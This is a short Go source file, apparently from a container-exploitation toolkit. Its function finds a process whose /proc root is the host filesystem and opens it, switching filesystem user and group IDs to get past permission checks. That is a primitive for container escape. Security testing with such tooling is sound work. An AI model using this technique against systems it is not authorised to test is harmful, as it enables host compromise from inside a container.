package proc_root

import (
	"fmt"
	"os"
	"syscall"

	"github.com/ctrsploit/ctrsploit/pkg/proc/root"
	"github.com/ctrsploit/ctrsploit/pkg/proc/status"
	"github.com/ctrsploit/ctrsploit/pkg/util"
	"github.com/pkg/errors"
	"github.com/ssst0n3/awesome_libs/awesome_error"
)

func getRootFd(pid int) (int, error) {
	fd := -1
	procRootPath := fmt.Sprintf("/proc/%d/root/", pid)
	action := func() error {
		inoRoot, err := root.GetInodeNumber(procRootPath)
		if err != nil {
			if os.IsNotExist(err) || errors.Is(err, os.ErrPermission) {
				return err
			}
			awesome_error.CheckErr(err)
			return err
		}
		if inoRoot == 2 {
			fd, err = syscall.Open(procRootPath, syscall.O_RDONLY, 0)
			if err != nil {
				awesome_error.CheckErr(err)
				return err
			}
		}
		return nil
	}
	// 1. quick detect
	err := action()
	if os.Geteuid() == 0 && errors.Is(err, os.ErrPermission) {
		s, err := status.ParseStatusFile(fmt.Sprintf("/proc/%d/status", pid))
		if err != nil {
			awesome_error.CheckErr(err)
			return fd, err
		}
		// TODO: check fsuid == ruid, euid, suid,
		// https://github.com/torvalds/linux/blob/v6.16/kernel/ptrace.c#L301-L322
		// because this access is caused by filesystem
		// so mode has PTRACE_MODE_FSCREDS
		// so we just need to switch fsuid, fsgid
		err = util.WithFsuidFsgid(s.Fsuid, s.Fsgid, action)
		return fd, err
	}
	return fd, err
}
